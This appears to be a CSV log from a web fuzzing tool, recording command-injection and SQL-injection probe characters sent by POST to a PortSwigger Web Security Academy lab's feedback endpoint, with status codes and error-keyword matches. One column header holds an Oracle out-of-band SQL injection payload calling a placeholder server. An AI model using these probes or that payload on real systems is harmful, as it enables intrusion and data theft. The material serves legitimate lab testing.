id_fuzz,#,Payload,URL,Method,StatusCode,SearchKeyword_error,SearchKeyword_exception,SearchKeyword_illegal,SearchKeyword_invalid,SearchKeyword_fail,SearchKeyword_stack,SearchKeyword_access,SearchKeyword_directory,SearchKeyword_file,SearchKeyword_not found,SearchKeyword_unknown,SearchKeyword_uid=,SearchKeyword_c:\,SearchKeyword_varchar,SearchKeyword_ODBC,SearchKeyword_SQL,SearchKeyword_quotation mark,SearchKeyword_syntax,SearchKeyword_ORA-,SearchKeyword_111111,SearchKeyword_test,SearchKeyword_test2,SearchKeyword_'||Utl_Http.request('http://<yourservername>') from dual--,TimeDelay,ContentLength
id_fuzz_1,1,`,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,2,|| ,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,3,| ,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,4,; ,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,5,',https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,6,"'""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,7,"""",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,8,"""'",https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,9,& ,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
id_fuzz_1,10,&& ,https://acd61fab1e084c658030037500b8007b.web-security-academy.net/feedback/submit,POST,400,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.281951,60
